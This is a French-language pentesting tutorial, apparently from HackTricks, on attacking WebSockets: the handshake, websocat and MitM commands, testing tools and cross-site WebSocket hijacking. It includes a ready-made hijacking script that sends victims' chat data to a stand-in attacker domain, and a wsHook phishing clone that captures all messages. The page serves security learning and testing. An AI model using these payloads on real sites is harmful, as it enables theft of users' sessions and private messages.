# Attaques WebSocket

{{#include ../banners/hacktricks-training.md}}

## Qu'est-ce que les WebSockets

Les connexions WebSocket sont établies par le biais d'une **négociation HTTP** initiale et sont conçues pour être **durables**, permettant une messagerie bidirectionnelle à tout moment sans avoir besoin d'un système transactionnel. Cela rend les WebSockets particulièrement avantageux pour les applications nécessitant une **latence faible ou une communication initiée par le serveur**, comme les flux de données financières en direct.

### Établissement des connexions WebSocket

Une explication détaillée sur l'établissement des connexions WebSocket peut être consultée [**ici**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). En résumé, les connexions WebSocket sont généralement initiées via JavaScript côté client comme indiqué ci-dessous :
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
Le protocole `wss` signifie une connexion WebSocket sécurisée avec **TLS**, tandis que `ws` indique une connexion **non sécurisée**.

Lors de l'établissement de la connexion, une poignée de main est effectuée entre le navigateur et le serveur via HTTP. Le processus de poignée de main implique que le navigateur envoie une requête et que le serveur répond, comme illustré dans les exemples suivants :

Le navigateur envoie une requête de poignée de main :
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Réponse de poignée de main du serveur :
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
La connexion reste ouverte pour l'échange de messages dans les deux sens une fois établie.

**Points clés de la poignée de main WebSocket :**

- Les en-têtes `Connection` et `Upgrade` signalent le début d'une poignée de main WebSocket.
- L'en-tête `Sec-WebSocket-Version` indique la version du protocole WebSocket souhaitée, généralement `13`.
- Une valeur aléatoire encodée en Base64 est envoyée dans l'en-tête `Sec-WebSocket-Key`, garantissant que chaque poignée de main est unique, ce qui aide à prévenir les problèmes avec les proxies de mise en cache. Cette valeur n'est pas destinée à l'authentification mais à confirmer que la réponse n'est pas générée par un serveur ou un cache mal configuré.
- L'en-tête `Sec-WebSocket-Accept` dans la réponse du serveur est un hachage de la `Sec-WebSocket-Key`, vérifiant l'intention du serveur d'ouvrir une connexion WebSocket.

Ces fonctionnalités garantissent que le processus de poignée de main est sécurisé et fiable, ouvrant la voie à une communication en temps réel efficace.

### Console Linux

Vous pouvez utiliser `websocat` pour établir une connexion brute avec un websocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Ou pour créer un serveur websocat :
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket connections

Si vous constatez que des clients sont connectés à un **HTTP websocket** depuis votre réseau local actuel, vous pourriez essayer une [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing) pour effectuer une attaque MitM entre le client et le serveur.\
Une fois que le client essaie de se connecter, vous pouvez alors utiliser :
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets enumeration

Vous pouvez utiliser l'**outil** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **pour découvrir, identifier et rechercher des** **vulnérabilités** **connues dans les websockets automatiquement.**

### Websocket Debug tools

- **Burp Suite** prend en charge la communication MitM des websockets de manière très similaire à la façon dont elle le fait pour la communication HTTP classique.
- L'**extension Burp Suite** [**socketsleuth**](https://github.com/snyk/socketsleuth) **vous permettra de mieux gérer les communications Websocket dans Burp en obtenant l'** **historique**, en définissant des **règles d'interception**, en utilisant des règles de **correspondance et de remplacement**, en utilisant **Intruder** et **AutoRepeater.**
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** Abréviation de "**WebSocket/Socket.io Proxy**", cet outil, écrit en Node.js, fournit une interface utilisateur pour **capturer, intercepter, envoyer des messages personnalisés** et visualiser toutes les communications WebSocket et Socket.IO entre le client et le serveur.
- [**wsrepl**](https://github.com/doyensec/wsrepl) est un **REPL websocket interactif** conçu spécifiquement pour les tests de pénétration. Il fournit une interface pour observer les **messages websocket entrants et envoyer de nouveaux**, avec un cadre facile à utiliser pour **automatiser** cette communication.&#x20;
- [**https://websocketking.com/**](https://websocketking.com/) c'est un **web pour communiquer** avec d'autres webs en utilisant des **websockets**.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) parmi d'autres types de communications/protocoles, il fournit un **web pour communiquer** avec d'autres webs en utilisant des **websockets.**

## Websocket Lab

Dans [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course), vous avez un code pour lancer un web utilisant des websockets et dans [**ce post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) vous pouvez trouver une explication.

## Cross-site WebSocket hijacking (CSWSH)

**Le détournement de WebSocket intersite**, également connu sous le nom de **détournement de WebSocket cross-origin**, est identifié comme un cas spécifique de **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** affectant les échanges WebSocket. Cette vulnérabilité survient lorsque les échanges WebSocket s'authentifient uniquement via des **cookies HTTP** sans **tokens CSRF** ou mesures de sécurité similaires.

Les attaquants peuvent en tirer parti en hébergeant une **page web malveillante** qui initie une connexion WebSocket intersite à une application vulnérable. Par conséquent, cette connexion est considérée comme faisant partie de la session de la victime avec l'application, exploitant le manque de protection CSRF dans le mécanisme de gestion des sessions.

### Simple Attack

Notez que lors de l'**établissement** d'une connexion **websocket**, le **cookie** est **envoyé** au serveur. Le **serveur** peut l'utiliser pour **relier** chaque **utilisateur spécifique** à sa **session websocket basée sur le cookie envoyé**.

Ensuite, si par **exemple** le **serveur websocket** **renvoie l'historique de la conversation** d'un utilisateur si un msg avec "**READY"** est envoyé, alors un **simple XSS** établissant la connexion (le **cookie** sera **envoyé** **automatiquement** pour autoriser l'utilisateur victime) **en envoyant** "**READY**" pourra **récupérer** l'historique de la **conversation**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie avec un sous-domaine différent

Dans cet article de blog [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/), l'attaquant a réussi à **exécuter du Javascript arbitraire dans un sous-domaine** du domaine où la communication WebSocket avait lieu. Comme c'était un **sous-domaine**, le **cookie** était **envoyé**, et parce que le **Websocket ne vérifiait pas correctement l'Origine**, il était possible de communiquer avec lui et **de voler des tokens**.

### Vol de données de l'utilisateur

Copiez l'application web que vous souhaitez imiter (les fichiers .html par exemple) et à l'intérieur du script où la communication Websocket a lieu, ajoutez ce code :
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
Téléchargez maintenant le fichier `wsHook.js` depuis [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) et **enregistrez-le dans le dossier contenant les fichiers web**.\
En exposant l'application web et en faisant en sorte qu'un utilisateur s'y connecte, vous pourrez voler les messages envoyés et reçus via websocket :
```javascript
sudo python3 -m http.server 80
```
## Conditions de course

Les Conditions de course dans les WebSockets sont également un sujet, [consultez cette information pour en savoir plus](race-condition.md#rc-in-websockets).

## Autres vulnérabilités

Comme les Web Sockets sont un mécanisme pour **envoyer des données vers le serveur et le client**, selon la manière dont le serveur et le client gèrent l'information, **les Web Sockets peuvent être utilisés pour exploiter plusieurs autres vulnérabilités comme XSS, SQLi ou toute autre vulnérabilité web courante en utilisant l'entrée d'un utilisateur depuis un websocket.**

## **WebSocket Smuggling**

Cette vulnérabilité pourrait vous permettre de **contourner les restrictions des proxies inverses** en leur faisant croire qu'une **communication websocket a été établie** (même si ce n'est pas vrai). Cela pourrait permettre à un attaquant d'**accéder à des points de terminaison cachés**. Pour plus d'informations, consultez la page suivante :

{{#ref}}
h2c-smuggling.md
{{#endref}}

## Références

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

{{#include ../banners/hacktricks-training.md}}
